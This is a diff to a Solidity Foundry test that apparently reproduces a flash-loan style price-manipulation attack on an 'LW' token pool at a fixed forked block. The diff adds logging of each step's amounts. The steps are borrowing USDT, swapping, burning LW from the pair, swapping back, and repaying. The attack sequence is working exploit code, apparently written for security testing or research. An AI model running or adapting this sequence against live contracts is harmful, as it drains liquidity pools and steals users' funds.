@@ -191,21 +191,35 @@ contract LWTestBase is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
+        emit log_named_uint("amt0", 1000000 ether);
         borrow_usdt_owner(1000000 ether);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
+        );
         swap_pair_attacker_usdt_lw(
             usdt.balanceOf(address(attacker)),
             pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", (2510e18 * 1e18) / lw.getTokenPrice());
         burn_lw_pair((2510e18 * 1e18) / lw.getTokenPrice());
         printBalance("After step2 ");
+        emit log_named_uint("amt4", lw.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
+                9) / 10
+        );
         swap_pair_attacker_lw_usdt(
             lw.balanceOf(address(attacker)),
             (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
                 9) / 10
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 1000000 ether);
         payback_usdt_owner(1000000 ether);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -230,7 +244,7 @@ contract LWTestBase is Test, BlockLoader {
         burn_lw_pair(amt3);
         swap_pair_attacker_lw_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
